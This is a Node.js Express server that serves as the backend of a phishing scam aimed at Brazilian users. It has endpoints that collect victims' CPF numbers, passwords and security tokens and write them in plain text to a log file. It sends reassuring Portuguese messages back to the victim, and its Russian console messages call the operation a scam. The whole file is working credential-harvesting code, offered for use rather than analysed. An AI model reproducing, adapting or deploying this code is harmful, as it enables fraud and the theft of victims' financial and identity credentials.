const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;
const NOME_ARQUIVO_LOG = 'cpf_passwords.txt';

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.post('/salvar-dados', (req, res) => {
    const { cpf, senha } = req.body;
    if (!cpf || !senha) {
        return res.status(400).json({ message: "Dados incompletos." });
    }

    const dataHora = new Date().toLocaleString('pt-BR');
    const linhaDeLog = `[LOGIN - ${dataHora}] - CPF: ${cpf} | Senha: ${senha}\n`;

    console.log('Получены данные:', linhaDeLog.trim());

    fs.appendFile(NOME_ARQUIVO_LOG, linhaDeLog, (err) => {
        if (err) {
            console.error('ОШИБКА ПРИ СОХРАНЕНИИ ФАЙЛА:', err);
        }
    });

    res.status(200).json({ message: 'Dados iniciais recebidos.' });
});

app.post('/salvar-tudo', (req, res) => {
    const { cpf, senha, token } = req.body;
    if (!cpf || !senha || !token) {
        return res.status(400).json({ message: "Dados finais incompletos." });
    }

    const dataHora = new Date().toLocaleString('pt-BR');
    const linhaDeLog = `[COMPLETO - ${dataHora}] - CPF: ${cpf} | Senha: ${senha} | Token: ${token}\n`;

    console.log('Финальный пакет получен:', linhaDeLog.trim());

    fs.appendFile(NOME_ARQUIVO_LOG, linhaDeLog, (err) => {
        if (err) {
            console.error('ОШИБКА ПРИ СОХРАНЕНИИ ФИНАЛЬНОГО ПАКЕТА:', err);
        }
        console.log('Афера завершена, поздравляю, ты — кусок дерьма <3');
    });

    res.status(200).json({ message: 'Processo finalizado.' });
});

app.post('/acessar-contratos', (req, res) => {
    const { cpf } = req.body;
    if (!cpf) {
        return res.status(400).json({ message: "CPF é obrigatório." });
    }

    const dataHora = new Date().toLocaleString('pt-BR');
    const linhaDeLog = `[CONTRATOS - ${dataHora}] - CPF: ${cpf}\n`;

    console.log('Данные контрактов получены:', linhaDeLog.trim());

    fs.appendFile(NOME_ARQUIVO_LOG, linhaDeLog, (err) => {
        if (err) {
            console.error('ОШИБКА ПРИ СОХРАНЕНИИ КОНТРАКТОВ:', err);
        }
    });

    res.status(200).json({ message: 'Acessando seus contratos. Por favor, aguarde...' });
});

app.listen(port, () => {
    console.log(`╔════════════════════════════════════════════════════════════════╗`);
console.log(`║ ▒▒  System Boot Sequence: n0fex-cz.norte_333 [v0.333]       ▒▒ ║`);
console.log(`║ ▒▒  Synthetic Node Core Initialized                         ▒▒ ║`);
console.log(`║ ▒▒  Protocol Status: ██████░░░░░░░░░░░░░░░░░░ [33%]         ▒▒ ║`);
console.log(`║ ▒▒  Host Signature: cz.norte / mode: ОБФУСКАЦИЯ             ▒▒ ║`);
console.log(`║ ▒▒  Listening on port :: 3000 | Interface: /public/         ▒▒ ║`);
console.log(`╚════════════════════════════════════════════════════════════════╝`);
console.log(`        >> Awaiting input... synthetic trace ready <<`);
});
